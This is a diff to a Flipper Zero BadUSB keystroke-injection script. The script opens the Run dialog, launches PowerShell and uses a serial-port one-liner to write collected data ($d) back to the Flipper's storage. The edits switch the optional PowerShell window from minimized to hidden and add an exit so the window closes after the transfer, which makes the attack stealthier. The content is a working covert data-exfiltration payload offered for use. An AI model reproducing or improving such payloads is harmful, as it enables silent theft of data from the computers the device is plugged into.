@@ -9,8 +9,8 @@ DELAY 500
 GUI r
 DELAY 500
 
-REM Optionally run powershell minimized
-REM STRING powershell -w 2
+REM Optionally run powershell hidden
+REM STRING powershell -w h
 
 REM Comment out the below line if you're using the optional hidden window above
 STRING powershell
@@ -35,7 +35,7 @@ ENTER
 DELAY 1000
 REM ## Perform 600 loops, to check if BadUSB is still active, wait 1 sec. If the Flipper is just disconnected, the loop will wait 4 sec.
 ALTSTRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly|Where{$_.InstanceID -match $SUSB -and $_.Class -eq "Ports"}) -split "COM")[1][0])",115200,'None',8,'one');$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();break}Catch{If(Get-PNPDevice -PresentOnly|Where {$_.InstanceID -match $BHID}){"BadUSB"}Else{"NoFZ";Start-Sleep 4};Start-Sleep 1}}
-REM ## Shorter Version, without debug output, no 4 Sec delay
-REM ALTSTRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly -Class 'Ports' -InstanceID 'USB\VID_0483&PID_5740*') -split "COM")[1][0])",115200,'None',8,'one');$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();break}Catch{Sleep 1}}
+REM ## Shorter Version, without debug output, no 4 Sec delay, exits powershell upon completion (useful when using powershell -w h)
+REM ALTSTRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly -Class 'Ports' -InstanceID 'USB\VID_0483&PID_5740*') -split "COM")[1][0])",115200,'None',8,'one');$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();break}Catch{Sleep 1}};exit
 
 ENTER
